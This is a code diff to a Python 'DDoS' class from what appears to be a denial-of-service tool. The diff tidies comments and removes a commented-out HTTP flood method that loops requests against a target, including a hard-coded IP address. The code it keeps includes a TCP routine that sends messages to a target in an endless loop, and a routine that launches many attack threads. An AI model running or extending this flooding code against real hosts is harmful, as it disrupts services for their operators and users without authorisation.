@@ -13,8 +13,6 @@ import psutil
 from colorama import Fore
 from src.help import Help
 
-# ./pinfo -d -uD -t 10000 -p 80 -s 120 192.168.0.0/16
-
 class DDoS:
     def __init__(self, target: str):
       self.target = target
@@ -81,28 +79,19 @@ class DDoS:
     def tcp_ddos_attack(self, target_ip, target_port):
       # create a socket object
       client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-      server_ip = "127.0.0.1"  # replace with the server's IP address
-      server_port = 8000  # replace with the server's port number
-      # establish connection with server
       client.connect((target_ip, target_port))
 
       while True:
-         # input message and send it to the server
          msg = "Hello World Umsida"
          client.send(msg.encode("utf-8")[:1024])
-
-         # receive message from the server
          response = client.recv(1024)
          response = response.decode("utf-8")
 
-         # if server sent us "closed" in the payload, we break out of the loop and close our socket
          if response.lower() == "closed":
-               break
+            break
 
          print(f"Received: {response}")
 
-      # close client socket (connection to the server)
       client.close()
       print("Connection to server closed")
           
@@ -137,22 +126,6 @@ class DDoS:
          thread = threading.Thread(target=attack)
          thread.start()
          print(f"Thread-{i+1} started.")
-
-
-    
-   #  def tcp_method(self):
-   #     i = 0
-   #     headers = {
-   #        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-   #     }
-   #     try:
-   #        while True:
-   #          # response = requests.get("103.139.25.68", headers=headers)
-   #          response = requests.get(f"https://{self.target}", headers=headers)
-   #          i += 1
-   #          print(f"{i}. Packet sent with status code: {response.status_code}")
-   #     except Exception as e:
-   #        print(f"Error: {e}")
 
 
     def start_tcp_flood(self, threads_count):
